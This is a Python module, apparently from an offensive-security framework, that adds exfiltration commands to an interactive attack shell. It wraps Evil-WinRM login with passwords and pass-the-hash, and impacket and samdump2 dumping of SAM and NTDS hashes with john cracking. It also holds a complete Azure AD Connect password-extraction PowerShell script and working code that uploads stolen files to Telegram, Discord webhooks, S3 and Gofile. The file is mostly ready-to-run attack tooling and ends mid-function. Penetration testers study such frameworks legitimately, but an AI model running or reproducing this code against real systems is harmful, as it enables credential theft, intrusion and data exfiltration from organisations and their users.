"""Data Exfiltration command set.

Covers data-out operations: XOR file encrypt/decrypt, Evil-WinRM
authentication, Active Directory dumpers (secretsdump, GetUserSPNs,
GetADUsers, gMSADumper, dploot, samdump2, reg.py, getnthash.py,
adgetpass), Git tree dumping, rsync deployment, infinitestorage video
evidence, Gofile uploads, cloud exfiltration (S3, GCS, Telegram,
Discord), DNS/ICMP covert channels, staged multi-channel exfil, and
the C2 implant download helpers.
"""

from __future__ import annotations

import base64
import gzip
import hashlib
import json
import os
import shlex
import shutil
import subprocess
import tempfile
import time
import zipfile
from datetime import UTC

import cmd2
import requests

from cli.commands._base import LazyOwnCommandSet
from core.crypto import xor_encrypt_decrypt
from utils import (
    GREEN,
    exfiltration_category,
    get_credentials,
    get_domain,
    get_hash,
    get_users_dic,
    is_binary_present,
    is_package_installed,
    print_error,
    print_msg,
    print_warn,
)

SESSIONS_DIRECTORY_NAME = "sessions"
CREDENTIALS_FILENAME = "credentials.txt"
USERS_FILENAME = "users.txt"
HASH_FILENAME = "hash.txt"
ENCRYPTED_FILE_SUFFIX = ".enc"
DEFAULT_ADMIN_USER = "Administrator"

IMPACKET_INSTALL_COMMAND = "sudo apt install impacket -y"
SAMDUMP2_INSTALL_COMMAND = "apt-get install samdump2 -y"
GIT_DUMPER_INSTALL_COMMAND = "pip3 install git-dumper"
GOFILE_UPLOAD_URL = "https://store1.gofile.io/contents/uploadfile"
GOFILE_OK_STATUS = "ok"

TELEGRAM_API_URL = "https://api.telegram.org/bot{token}/sendDocument"
TELEGRAM_MAX_SIZE = 50 * 1024 * 1024
DISCORD_MAX_SIZE = 25 * 1024 * 1024
EXFIL_CHUNK_SIZE = 24 * 1024 * 1024
DNS_CHUNK_SIZE = 40
ICMP_CHUNK_SIZE = 48
STAGE_COMPRESS_LEVEL = 9
PKINIT_REPOSITORY_URL = "https://github.com/dirkjanm/PKINITtools.git"
PKINIT_RELATIVE_PATH = os.path.join("external", ".exploit", "PKINITtools")
PKINIT_DEPS_INSTALL_COMMAND = "pip3 install impacket minikerberos"
GMSADUMPER_REPOSITORY_URL = "https://github.com/micahvandeusen/gMSADumper.git"
GMSADUMPER_RELATIVE_PATH = os.path.join("external", ".exploit", "gMSADumper")
DPLOOT_REPOSITORY_URL = "https://github.com/zblurx/dploot.git"
DPLOOT_RELATIVE_PATH = os.path.join("external", ".exploit", "dploot")
INFINITE_STORAGE_SCRIPT = "modules_ext/lazyown_infinitestorage/lazyown_infinitestorage.py"
ENCODED_OUTPUT_FILENAME = "encoded_output.avi"
DECODED_OUTPUT_DIRECTORY = "sessions/decoded_output"
DEFAULT_VIDEO_WIDTH = "1920"
DEFAULT_VIDEO_HEIGHT = "1080"
DEFAULT_VIDEO_FPS = "25"
ENCRYPT_ARG_COUNT = 2
EVIDENCE_VIDEO_EXTENSIONS = (".mp4", ".mkv", ".avi")
EVIDENCE_EXCLUDED_EXTENSIONS = (".grisun0",)
EVIDENCE_ZIP_FILENAME = "sessions.zip"
DEFAULT_REG_USERNAME = "henry.vinson"
DEFAULT_REG_KEY_NAME = "HKU\\\\Software"
DEFAULT_ADSYNC_DATABASE = "ADSync"
DEFAULT_ADSYNC_KEY_ID = "1"
DEFAULT_ADSYNC_DLL_PATH = "C:\\Program Files\\Microsoft Azure AD Sync\\Bin\\mcrypt.dll"
DEFAULT_ADSYNC_CONFIG_LOGIN_DOMAIN = "forest-login-domain"
DEFAULT_ADSYNC_CONFIG_LOGIN_USER = "forest-login-user"
ADCONNECT_SCRIPT_RELATIVE_PATH = "sessions/adconnect.ps1"
DPLOOT_DEFAULT_BLOB = "DFBE70A7E5CC19A398EBF1B96859CE5D"
DPLOOT_DEFAULT_ACTION = "blob"
DPLOOT_ACTION_PROMPT = (
    "    [!] Enter the action "
    "(backupkey,blob,browser,certificates,credentials,machinecertificates,"
    "machinecredentials,machinemasterkeys,machinetriage,machinevaults,"
    "masterkeys,mobaxterm,rdg,sccm,triage,vaults,wam,wifi) "
    f"default: {DPLOOT_DEFAULT_ACTION}"
)
DPLOOT_NO_ARG_ACTIONS = (
    "machinemasterkeys",
    "machinecredentials",
    "machinevaults",
    "machinecertificates",
    "wifi",
    "sccm",
)
DPLOOT_MKFILE_ACTIONS = ("certificates", "credentials", "vaults", "rdg")
DPLOOT_PVK_KEY_ACTIONS = ("mobaxterm", "wam")
RSYNC_REMOTE_DROP_PATH = "/home/.grisun0"
ADSYNC_POWERSHELL_TEMPLATE = """Write-Host "AD Connect Sync Credential Extract POC (@_xpn_)`n"
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server={server};Database={database};Trusted_Connection=true"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

add-type -path '{dll_path}'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet([GUID]"{entropy}", [GUID]"{instance_id}", {key_id})
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)

$domain = (select-xml -Content $config -XPath "//parameter[@name='{config1}']").Node.InnerText
$username = (select-xml -Content $config -XPath "//parameter[@name='{config2}']").Node.InnerText
$password = (select-xml -Content $decrypted -XPath "//attribute").Node.InnerText

Write-Host ("Domain: " + $domain)
Write-Host ("Username: " + $username)
Write-Host ("Password: " + $password)
"""


def _sessions_path(base_path: str) -> str:
    """Return the absolute ``sessions/`` directory under ``base_path``."""
    return os.path.join(base_path, SESSIONS_DIRECTORY_NAME)


def _read_first_credential(credentials_file: str) -> tuple[str, str] | None:
    """Return the first ``username:password`` pair from ``credentials_file``.

    Args:
        credentials_file: Path to a colon-separated ``credentials.txt``.

    Returns:
        A tuple ``(username, password)`` or ``None`` when the file is
        empty or malformed.
    """
    if not os.path.exists(credentials_file):
        return None
    with open(credentials_file, encoding="utf-8") as handle:
        text = handle.read().strip()
    if not text:
        return None
    first_line = text.splitlines()[0]
    if ":" not in first_line:
        return None
    username, password = first_line.split(":", 1)
    return username, password


def _extract_flag(args: list[str], flag: str) -> str | None:
    """Extract a ``--flag <value>`` pair from a list of arguments.

    Args:
        args: Token list from ``shlex.split(line)``.
        flag: The flag name including leading dashes.

    Returns:
        The flag value or ``None`` if the flag is not present.
    """
    try:
        idx = args.index(flag)
        return args[idx + 1]
    except (ValueError, IndexError):
        return None


def _split_file(file_path: str, output_dir: str, chunk_size: int) -> None:
    """Split a file into fixed-size chunks in ``output_dir``.

    Args:
        file_path: Source file path.
        output_dir: Directory to write chunk files.
        chunk_size: Maximum bytes per chunk.
    """
    base_name = os.path.basename(file_path)
    with open(file_path, "rb") as src:
        idx = 0
        while True:
            chunk = src.read(chunk_size)
            if not chunk:
                break
            chunk_path = os.path.join(output_dir, f"{base_name}.part{idx:04d}")
            with open(chunk_path, "wb") as dst:
                dst.write(chunk)
            idx += 1


def _send_telegram_file(file_path: str, bot_token: str, chat_id: str, caption: str) -> None:
    """Send a file to a Telegram chat via the Bot API.

    Args:
        file_path: Local file to send.
        bot_token: Telegram Bot API token.
        chat_id: Target chat ID.
        caption: File caption text.
    """
    url = TELEGRAM_API_URL.format(token=bot_token)
    with open(file_path, "rb") as f:
        resp = requests.post(
            url,
            data={"chat_id": chat_id, "caption": caption},
            files={"document": (os.path.basename(file_path), f)},
            timeout=120,
        )
    if resp.status_code == 200 and resp.json().get("ok"):
        print_msg(f"Sent {os.path.basename(file_path)} via Telegram")
    else:
        print_error(f"Telegram send failed: {resp.status_code} {resp.text[:200]}")


def _send_discord_file(file_path: str, webhook_url: str, filename: str) -> None:
    """Send a file to a Discord channel via webhook.

    Args:
        file_path: Local file to send.
        webhook_url: Discord webhook URL.
        filename: Display name for the attachment.
    """
    with open(file_path, "rb") as f:
        resp = requests.post(
            webhook_url,
            files={"file": (filename, f)},
            timeout=60,
        )
    if resp.status_code in (200, 204):
        print_msg(f"Sent {filename} via Discord")
    else:
        print_error(f"Discord send failed: {resp.status_code} {resp.text[:200]}")


def _upload_s3_presigned(
    file_path: str,
    bucket: str,
    object_key: str,
    access_key: str,
    secret_key: str,
    region: str,
) -> None:
    """Upload a file to S3 using a manually-signed presigned URL.

    Args:
        file_path: Local file to upload.
        bucket: S3 bucket name.
        object_key: S3 object key.
        access_key: AWS access key.
        secret_key: AWS secret key.
        region: AWS region name.
    """
    import hashlib as _hashlib
    import hmac
    from datetime import datetime

    with open(file_path, "rb") as f:
        data = f.read()

    amz_date = datetime.now(UTC).strftime("%Y%m%dT%H%M%SZ")
    date_stamp = datetime.now(UTC).strftime("%Y%m%d")
    service = "s3"
    algorithm = "AWS4-HMAC-SHA256"
    content_type = "application/octet-stream"
    payload_hash = _hashlib.sha256(data).hexdigest()

    canonical_uri = "/" + object_key
    canonical_querystring = ""
    canonical_headers = f"content-type:{content_type}\nhost:{bucket}.s3.{region}.amazonaws.com\nx-amz-content-sha256:{payload_hash}\nx-amz-date:{amz_date}\n"
    signed_headers = "content-type;host;x-amz-content-sha256;x-amz-date"
    canonical_request = (
        f"PUT\n{canonical_uri}\n{canonical_querystring}\n{canonical_headers}\n{signed_headers}\n{payload_hash}"
    )

    credential_scope = f"{date_stamp}/{region}/{service}/aws4_request"
    string_to_sign = (
        f"{algorithm}\n{amz_date}\n{credential_scope}\n{_hashlib.sha256(canonical_request.encode()).hexdigest()}"
    )

    def _sign(key, msg):
        return hmac.new(key, msg.encode(), _hashlib.sha256).digest()

    signing_key = _sign(
        _sign(_sign(_sign(("AWS4" + secret_key).encode(), date_stamp), region), service), "aws4_request"
    )
    signature = hmac.new(signing_key, string_to_sign.encode(), _hashlib.sha256).hexdigest()

    auth_header = (
        f"{algorithm} Credential={access_key}/{credential_scope}, SignedHeaders={signed_headers}, Signature={signature}"
    )
    url = f"https://{bucket}.s3.{region}.amazonaws.com/{object_key}"

    resp = requests.put(
        url,
        data=data,
        headers={
            "Content-Type": content_type,
            "Host": f"{bucket}.s3.{region}.amazonaws.com",
            "x-amz-content-sha256": payload_hash,
            "x-amz-date": amz_date,
            "Authorization": auth_header,
        },
        timeout=120,
    )
    if resp.status_code in (200, 201):
        print_msg(f"Uploaded {file_path} to s3://{bucket}/{object_key}")
    else:
        print_error(f"S3 presigned upload failed: HTTP {resp.status_code}")


class ExfiltrationCommandSet(LazyOwnCommandSet):
    """Pending phase module for the Data Exfiltration commands."""

    phase = "exfil"
    category = exfiltration_category

    @cmd2.with_category(exfiltration_category)
    def do_encrypt(self, line):
        """Encrypt a file with XOR using a caller-supplied key.

        Args:
            line: Whitespace-separated ``<file_path> <key>``. Anything
                else triggers a usage error.

        Returns:
            None.
        """
        arguments = shlex.split(line)
        if len(arguments) != ENCRYPT_ARG_COUNT:
            print_error("Usage: encrypt <file_path> <key>")
            return
        file_path, key = arguments
        try:
            with open(file_path, "rb") as handle:
                data = handle.read()
            encrypted = xor_encrypt_decrypt(data, key)
            output_path = file_path + ENCRYPTED_FILE_SUFFIX
            with open(output_path, "wb") as handle:
                handle.write(encrypted)
            print_msg(f"File encrypted: {output_path}")
        except FileNotFoundError:
            print_error(f"File not found: {file_path}")

    @cmd2.with_category(exfiltration_category)
    def do_decrypt(self, line):
        """Decrypt an XOR-encrypted file using the matching key.

        Args:
            line: Whitespace-separated ``<file_path> <key>``. Anything
                else triggers a usage error. The ``.enc`` suffix is
                stripped from the output filename when present.

        Returns:
            None.
        """
        arguments = shlex.split(line)
        if len(arguments) != ENCRYPT_ARG_COUNT:
            print_error("Usage: decrypt <file_path> <key>")
            return
        file_path, key = arguments
        try:
            with open(file_path, "rb") as handle:
                data = handle.read()
            decrypted = xor_encrypt_decrypt(data, key)
            output_path = file_path.replace(ENCRYPTED_FILE_SUFFIX, "")
            with open(output_path, "wb") as handle:
                handle.write(decrypted)
            print_msg(f"File decrypted: {output_path}")
        except FileNotFoundError:
            print_error(f"File not found: {file_path}")

    @cmd2.with_category(exfiltration_category)
    def do_evilwinrm(self, line):
        """Drive Evil-WinRM through password, hash or kerberos-only auth.

        Modes:
            ``pass`` reuses entries from ``sessions/credentials*.txt``.
            ``hash`` reads ``sessions/hash.txt`` for an NT hash and
            prompts for a username (default ``Administrator``).
            ``nopass`` connects to ``<subdomain>.<domain>`` without
            credentials.

        Args:
            line: Sub-command starting with ``pass``, ``hash`` or
                ``nopass``, optionally followed by counter / PowerShell
                flags for ``pass``.

        Returns:
            None.
        """
        from utils import check_rhost

        rhost = self.params["rhost"]
        domain = self.params["domain"]
        subdomain = self.params["subdomain"]
        hash_txt = os.path.join(self.path, SESSIONS_DIRECTORY_NAME, HASH_FILENAME)
        if not check_rhost(rhost):
            return
        if line.startswith("pass"):
            tokens = line.split(" ")
            ps1 = ""
            if len(tokens) == 2:
                ncredent = tokens[1]
                credentials = get_credentials(ncred=int(ncredent)) if ncredent else get_credentials()
            elif len(tokens) == 3:
                ncredent = tokens[1]
                powershell = tokens[2]
                credentials = get_credentials(ncred=int(ncredent))
                ps1 = "-s . " if powershell == "y" else ""
            else:
                credentials = get_credentials()
                ask = input("    [?] Do you pass a powershell ? (y/n): ") or "n"
                ps1 = "-s . " if ask == "y" else ""
            if not credentials:
                print_error(f"error {credentials}")
                return
            for user, password in credentials:
                command = f"cd {SESSIONS_DIRECTORY_NAME} && evil-winrm -i {rhost} -u {user} -p '{password}' {ps1}"
                print_msg(command)
                self.cmd(command)
            return
        if line.startswith("hash"):
            if not os.path.exists(hash_txt):
                print_error(f"{hash_txt} not found.")
                return
            hash_value = get_hash()
            if not hash_value:
                return
            user = input(f"    [!] Enter Username (default: {DEFAULT_ADMIN_USER})") or DEFAULT_ADMIN_USER
            command = f"evil-winrm -i {rhost} -u {user} -H '{hash_value}'"
            print_msg(command)
            self.cmd(command)
            return
        if line.startswith("nopass"):
            command = f"evil-winrm -i {subdomain}.{domain} -r {domain}"
            print_msg(command)
            self.cmd(command)
            return
        print_error(
            "Invalid usage. Use 'pass' to authenticate, 'hash' to use hashes, or 'nopass' to skip the password."
        )

    @cmd2.with_category(exfiltration_category)
    def do_secretsdump(self, line):
        """Run impacket-secretsdump for SAM, credentials, or NTDS payloads.

        Sub-commands:
            ``sam``     parses local ``sessions/SAM`` + ``sessions/SYSTEM``
            ``creds``   iterates ``sessions/credentials.txt`` pairs
            ``system``  parses live ``ntds.dit`` + registry hives

        Args:
            line: Sub-command from the list above. Empty input prints
                the usage error.

        Returns:
            None.
        """
        if not is_binary_present("secretsdump.py"):
            print_warn("secretsdump.py is not installed. Installing dependencies.")
            self.cmd(IMPACKET_INSTALL_COMMAND)
        print_msg("Gathering credentials for secretsdump.py execution...")
        url = self.params["url"]
        rhost = self.params["rhost"]
        wordlist = self.params["wordlist"]
        dominio = get_domain(url)
        credentials_path = os.path.join(SESSIONS_DIRECTORY_NAME, CREDENTIALS_FILENAME)
        if not line:
            print_error("use options line like: secretsdump sam | creds | system")
            return
        if line.startswith("sam"):
            system_path = os.path.join(SESSIONS_DIRECTORY_NAME, "SYSTEM")
            if not os.path.exists(system_path):
                print_error("You need credentials.txt or SAM and SYSTEM files")
                return
            hashs = os.path.join(SESSIONS_DIRECTORY_NAME, "hashs.txt")
            command = (
                f"secretsdump.py -system {SESSIONS_DIRECTORY_NAME}/SYSTEM "
                f"-sam {SESSIONS_DIRECTORY_NAME}/SAM LOCAL -outputfile {hashs}"
            )
            print_msg(f"Executing command: {command}")
            self.cmd(command)
            self.cmd(f"nano {hashs}.sam")
            self.cmd(f"cat {hashs}.sam")
            command = f"sudo john --fork=4 --format=nt {hashs}.sam --wordlist={wordlist}"
            print_msg(command)
            self.cmd(command)
            self.cmd(f"sudo john {hashs}.sam --show")
            return
        if line.startswith("creds"):
            with open(credentials_path, encoding="utf-8") as handle:
                for file_line in handle:
                    parts = file_line.split(":")
                    username = parts[0]
                    password = parts[1].replace("\n", "")
                    domain = input(f"    [!] Domain: (default: {dominio})").strip() or dominio
                    ip_address = input(f"    [!] IP Address: (default: {rhost})").strip() or rhost
                    command = f"secretsdump.py {domain}/{username}:{password}@{ip_address}"
                    print_msg(f"Executing command: {command}")
                    self.cmd(command)
                    return
        if line.startswith("system"):
            command = (
                f"cd {SESSIONS_DIRECTORY_NAME} && secretsdump.py local "
                "-system registry/SYSTEM -security registry/SECURITY "
                "-ntds Active\\ Directory/ntds.dit -outputfile hashes"
            )
            print_msg(command)
            self.cmd(command)
            command = f"cd {SESSIONS_DIRECTORY_NAME} && cut -d ':' -f 4 hashes.ntds > hashes.txt"
            print_msg(command)
            self.cmd(command)
            command = f"cd {SESSIONS_DIRECTORY_NAME} && awk -F ':' '{{print $3 \":\" $4}}' hashes.ntds > hashes2.txt"
            print_msg(command)
            self.cmd(command)

    @cmd2.with_category(exfiltration_category)
    def do_getuserspns(self, line):
        """Run impacket-GetUserSPNs to request roastable service tickets.

        Args:
            line: Optional username to use in place of the first entry
                from ``sessions/credentials.txt``.

        Returns:
            None.
        """
        if not is_binary_present("GetUserSPNs.py"):
            print_warn("GetUserSPNs.py is not installed. Installing dependencies.")
            self.cmd(IMPACKET_INSTALL_COMMAND)
        print_msg("Gathering credentials for GetUserSPNs.py execution...")
        url = self.params["url"]
        rhost = self.params["rhost"]
        dominio = get_domain(url)
        domain = input(f"    [!] Domain: (default: {dominio}) ").strip() or dominio
        credentials_path = os.path.join(SESSIONS_DIRECTORY_NAME, CREDENTIALS_FILENAME)
        if not os.path.exists(credentials_path):
            username = input("    [!] Username: ").strip()
            password = input("    [!] Password: ").strip()
        else:
            with open(credentials_path, encoding="utf-8") as handle:
                for file_line in handle:
                    parts = file_line.split(":")
                    username = line if line else parts[0]
                    password = parts[1].replace("\n", "")
        ip_address = input(f"    [!] IP Address: (default: {rhost}) ").strip() or rhost
        command = f"GetUserSPNs.py {domain}/{username}:{password} -dc-ip {ip_address} -request"
        print_msg(f"Executing command: {command}")
        self.cmd(command)

    @cmd2.with_category(exfiltration_category)
    def do_gitdumper(self, line):
        """Install ``git-dumper`` if missing and pull a remote ``.git`` tree.

        Args:
            line: Unused; an interactive prompt collects the repo URL.

        Returns:
            None.
        """
        del line
        url = self.params["url"]
        if not is_package_installed("git-dumper"):
            print_warn("git-dumper not found. Installing...")
            self.cmd(GIT_DUMPER_INSTALL_COMMAND)
        repo_url = input(f"Enter the Git repository URL (e.g., default: {url}").strip() or url
        if not repo_url:
            print_error("Repository URL is required.")
            return
        domain = get_domain(repo_url)
        output_dir = os.path.join(self.path, SESSIONS_DIRECTORY_NAME, domain)
        command = f"git-dumper {repo_url} {output_dir}"
        print_msg(f"Executing command: {command}")
        self.cmd(command)

    @cmd2.with_category(exfiltration_category)
    def do_evidence(self, line=""):
        """Encode the ``sessions/`` tree into a video file or decode one back.

        Default invocation compresses ``sessions/`` to
        ``sessions.zip`` and renders ``sessions/encoded_output.avi`` via
        the infinitestorage helper. Pass ``decode`` to pick a video and
        recover its original payload.

        Args:
            line: ``decode`` to enter decode mode; anything else encodes.

        Returns:
            None.
        """
        sessions_dir = SESSIONS_DIRECTORY_NAME
        zip_file_path = EVIDENCE_ZIP_FILENAME
        if line and line.startswith("decode"):
            video_files = [f for f in os.listdir(sessions_dir) if f.endswith(EVIDENCE_VIDEO_EXTENSIONS)]
            if not video_files:
                print_error("No videos in the 'sessions' folder.")
                return
            print_msg("Videos available for decoding:")
            for idx, video in enumerate(video_files, start=1):
                print_msg(f"{idx}: {video}")
            choice = input("Choose the video number to decode: ")
            try:
                choice = int(choice)
            except ValueError:
                print_error("Please enter a valid number.")
                return
            if not 1 <= choice <= len(video_files):
                print_error("Invalid selection.")
                return
            video_file = video_files[choice - 1]
            video_full_path = os.path.join(self.path, sessions_dir, video_file)
            if not os.path.isfile(video_full_path):
                print_error(f"Error: {video_full_path} does not exist.")
                return
            command = [
                "python3",
                INFINITE_STORAGE_SCRIPT,
                "--mode",
                "decode",
                "--input",
                video_full_path,
                "--output",
                DECODED_OUTPUT_DIRECTORY,
                "--frame_size",
                DEFAULT_VIDEO_WIDTH,
                DEFAULT_VIDEO_HEIGHT,
                "--fps",
                DEFAULT_VIDEO_FPS,
            ]
            print_msg(f"Decoding {video_file}...")
        else:
            self.cmd(f"zip -r {zip_file_path} {sessions_dir}")
            print_msg(f"Folder {sessions_dir} compressed to {zip_file_path}.")
            command = [
                "python3",
                INFINITE_STORAGE_SCRIPT,
                "--mode",
                "encode",
                "--input",
                zip_file_path,
                "--output",
                f"{SESSIONS_DIRECTORY_NAME}/{ENCODED_OUTPUT_FILENAME}",
                "--frame_size",
                DEFAULT_VIDEO_WIDTH,
                DEFAULT_VIDEO_HEIGHT,
                "--fps",
                DEFAULT_VIDEO_FPS,
            ]
            print_msg("Encoding to video...")
        try:
            subprocess.run(command, check=True)
            print_msg("Command executed successfully: " + " ".join(command))
        except subprocess.CalledProcessError as error:
            print_error(f"Error running the command: {error}")

    @cmd2.with_category(exfiltration_category)
    def do_getadusers(self, line):
        """Run impacket-GetADUsers to enumerate AD accounts on the DC.

        When ``sessions/credentials.txt`` is present the helper iterates
        each pair authenticated to ``rhost``. Otherwise it offers the
        list of ``.txt`` files under ``sessions/`` so the operator can
        select a username list and brute-force kerberos pre-auth.

        Args:
            line: Unused.

        Returns:
            None.
        """
        del line
        sessions_dir = SESSIONS_DIRECTORY_NAME
        rhost = self.params["rhost"]
        domain = self.params["domain"]
        credentials_path = os.path.join(sessions_dir, CREDENTIALS_FILENAME)
        if os.path.exists(credentials_path):
            credentials = get_credentials()
            if not credentials:
                return
            for user, password in credentials:
                from utils import copy2clip

                try:
                    copy2clip(password)
                    command = f"GetADUsers.py {domain}/{user} -dc-ip {rhost} -debug"
                    print_msg(command)
                    self.cmd(command)
                except Exception as error:
                    print_error(f"Failed to execute GetADUsers: {error}")
            return
        txt_files = [f for f in os.listdir(sessions_dir) if f.endswith(".txt")]
        if not txt_files:
            print_error("No .txt files found in the 'sessions' directory.")
            return
        print_msg("Available .txt files:")
        for idx, name in enumerate(txt_files):
            print_msg(f"{idx}: {name}")
        try:
            file_index = int(input(f"    {GREEN}[!] Select the file number to use: "))
            selected_file = txt_files[file_index]
        except (IndexError, ValueError):
            print_error("Invalid selection.")
            return
        selected_file_path = os.path.join(sessions_dir, selected_file)
        try:
            with open(selected_file_path, encoding="utf-8") as handle:
                for entry in handle:
                    username = entry.strip()
                    if not username:
                        continue
                    command = f"GetADUsers.py {domain}/{username} -no-pass -dc-ip {rhost} -debug -k 2>/dev/null"
                    print_msg(f"Executing: {command}")
                    self.cmd(command)
        except Exception as error:
            print_error(f"Failed to execute GetADUsers for users in {selected_file_path}: {error}")

    @cmd2.with_category(exfiltration_category)
    def do_adgetpass(self, line):
        """Generate a PowerShell script to extract Azure AD Connect credentials.

        Renders the standard ``mcrypt.dll`` key-manager script with
        operator-provided GUIDs and SQL identifiers, writing it to
        ``sessions/adconnect.ps1`` for upload to the target.

        Args:
            line: Space-separated ``server database keyset_id instance_id entropy``.
                Each missing positional triggers an interactive prompt.

        Returns:
            None.
        """
        arguments = line.split() if line else []
        subdomain = self.params["subdomain"]
        server = (
            arguments[0]
            if len(arguments) > 0
            else (input(f"    [!] Enter the SQL Server (default '{subdomain}'): ").strip() or subdomain)
        )
        database = (
            arguments[1]
            if len(arguments) > 1
            else (
                input(f"    [!] Enter the Database Name (default '{DEFAULT_ADSYNC_DATABASE}'): ").strip()
                or DEFAULT_ADSYNC_DATABASE
            )
        )
        key_id = (
            arguments[2]
            if len(arguments) > 2
            else (
                input(f"    [!] Enter Keyset ID (default '{DEFAULT_ADSYNC_KEY_ID}'): ").strip() or DEFAULT_ADSYNC_KEY_ID
            )
        )
        instance_id = arguments[3] if len(arguments) > 3 else input("    [!] Enter Instance ID (GUID): ").strip()
        entropy = arguments[4] if len(arguments) > 4 else input("    [!] Enter Entropy (GUID): ").strip()
        dll_path = (
            input(f"    [!] Enter the path to 'mcrypt.dll' (default '{DEFAULT_ADSYNC_DLL_PATH}'): ").strip()
            or DEFAULT_ADSYNC_DLL_PATH
        )
        config1 = (
            input(f"    [!] enter parameter no 1 (default: {DEFAULT_ADSYNC_CONFIG_LOGIN_DOMAIN})")
            or DEFAULT_ADSYNC_CONFIG_LOGIN_DOMAIN
        )
        config2 = (
            input(f"    [!] enter parameter no 2 (default: {DEFAULT_ADSYNC_CONFIG_LOGIN_USER})")
            or DEFAULT_ADSYNC_CONFIG_LOGIN_USER
        )
        rendered = (
            ADSYNC_POWERSHELL_TEMPLATE.replace("{server}", server)
            .replace("{database}", database)
            .replace("{dll_path}", dll_path)
            .replace("{entropy}", entropy)
            .replace("{instance_id}", instance_id)
            .replace("{key_id}", key_id)
            .replace("{config1}", config1)
            .replace("{config2}", config2)
        )
        with open(ADCONNECT_SCRIPT_RELATIVE_PATH, "w", encoding="utf-8") as handle:
            handle.write(rendered)
        print_msg(f"PowerShell script '{ADCONNECT_SCRIPT_RELATIVE_PATH}' has been created.")

    @cmd2.with_category(exfiltration_category)
    def do_samdump2(self, line):
        """Run samdump2 against ``sessions/SYSTEM`` and ``sessions/SAM``.

        Args:
            line: Unused.

        Returns:
            None.
        """
        del line
        rhost = self.params["rhost"]
        if not is_binary_present("samdump2"):
            print_warn("samdump2 is not installed. Installing dependencies.")
            self.cmd(SAMDUMP2_INSTALL_COMMAND)
        if not os.path.exists(os.path.join(SESSIONS_DIRECTORY_NAME, "SYSTEM")):
            print_error("You need credentials.txt or SAM and SYSTEM files")
            return
        output_file = os.path.join(SESSIONS_DIRECTORY_NAME, f"samdump_{rhost}.txt")
        command = f"samdump2 {SESSIONS_DIRECTORY_NAME}/SYSTEM {SESSIONS_DIRECTORY_NAME}/SAM -o {output_file}"
        print_msg(f"Executing command: {command}")
        self.cmd(command)
        self.cmd(f"cat {output_file}")
        self.logcsv(f"samdump2 {command}")

    @cmd2.with_category(exfiltration_category)
    def do_reg_py(self, line):
        """Query a remote registry hive with impacket-reg.py over hash auth.

        Args:
            line: Unused.

        Returns:
            None.
        """
        del line
        subdomain = self.params["subdomain"]
        domain = self.params["domain"]
        if not is_binary_present("reg.py"):
            print_warn("reg.py is not installed. Installing.")
            self.cmd(IMPACKET_INSTALL_COMMAND)
            return
        hash_value = get_hash()
        domain = input(f"Enter domain (e.g., {domain}): ") or domain
        subdomain = input(f"Enter dc domain (e.g., {subdomain}): ") or subdomain
        username = input(f"Enter username (e.g., {DEFAULT_REG_USERNAME}): ") or DEFAULT_REG_USERNAME
        key_name = input(f"Enter registry key (e.g., {DEFAULT_REG_KEY_NAME}): ") or DEFAULT_REG_KEY_NAME
        for binary in ("reg.py", "impacket-reg"):
            command = f"{binary} -hashes {hash_value} {domain}/{username}@{subdomain} query -keyName {key_name}"
            print_msg(f"Executing command: {command}")
            self.cmd(command)

    @cmd2.with_category(exfiltration_category)
    def do_unzip(self, line):
        """Extract a zip archive located under ``sessions/``.

        Args:
            line: Optional zip filename. Empty input picks the first
                ``*.zip`` discovered via :func:`get_users_dic`.

        Returns:
            None.
        """
        zips = line.strip() if line else get_users_dic("zip")
        if not zips:
            print_error("No zip files found at sessions directory")
            return
        if not os.path.exists(zips):
            print_error("No zip files found at sessions path directory")
            return
        command = f"cd {SESSIONS_DIRECTORY_NAME} && unzip {zips}"
        print_msg(f"Try {command}")
        self.cmd(command)

    @cmd2.with_category(exfiltration_category)
    def do_getnthash_py(self, line):
        """Recover the NT hash from a Kerberos U2U TGS via PKINITtools.

        Args:
            line: Unused; the helper iterates ``sessions/credentials.txt``.

        Returns:
            None.
        """
        del line
        pkinit_path = os.path.join(self.path, PKINIT_RELATIVE_PATH)
        if not os.path.exists(pkinit_path):
            self.cmd(f"git clone {PKINIT_REPOSITORY_URL} {pkinit_path}")
            self.cmd(PKINIT_DEPS_INSTALL_COMMAND)
        domain = self.params["domain"]
        credentials_path = os.path.join(self.path, SESSIONS_DIRECTORY_NAME, CREDENTIALS_FILENAME)
        if not os.path.exists(credentials_path):
            print_error("Need credentials to use this option. Use: createcredentials admin:admin")
            return
        credentials = get_credentials()
        if not credentials:
            return
        for user, password in credentials:
            command = (
                f"cd {SESSIONS_DIRECTORY_NAME} && "
                f"export KRB5CCNAME={user}.cache && "
                f"python3 {pkinit_path}/getnthash.py {domain}/{user} -key {password}"
            )
            print_msg(command)
            self.cmd(command)

    @cmd2.with_category(exfiltration_category)
    def do_upload_gofile(self, line):
        """Upload a file from ``sessions/`` to Gofile via its HTTP API.

        The helper enumerates non-excluded files under ``sessions/``, asks
        the operator to pick one, posts it to ``store1.gofile.io``, and
        prints the resulting metadata.

        Args:
            line: Unused.

        Returns:
            None.
        """
        del line
        file_list: list[str] = []
        for root, _dirs, files in os.walk(SESSIONS_DIRECTORY_NAME):
            for name in files:
                if any(name.endswith(ext) for ext in EVIDENCE_EXCLUDED_EXTENSIONS):
                    continue
                file_list.append(os.path.join(root, name))
        if not file_list:
            print_error("No files found in the sessions directory.")
            return
        print_msg("Select a file to Upload:")
        for idx, name in enumerate(file_list, 1):
            print_msg(f"  {idx}) {name}")
        choice_text = input(f"    [!] Enter the number of the file (1-{len(file_list)}): ").strip()
        try:
            choice = int(choice_text)
        except ValueError:
            print_error("Invalid input. Please enter a number.")
            return
        if not 1 <= choice <= len(file_list):
            print_warn("Invalid choice.")
            return
        file_path = file_list[choice - 1]
        if not os.path.isfile(file_path):
            print_error(f"File '{file_path}' does not exist.")
            return
        try:
            with open(file_path, "rb") as handle:
                files_payload = {"file": handle}
                response = requests.post(GOFILE_UPLOAD_URL, files=files_payload)
            response.raise_for_status()
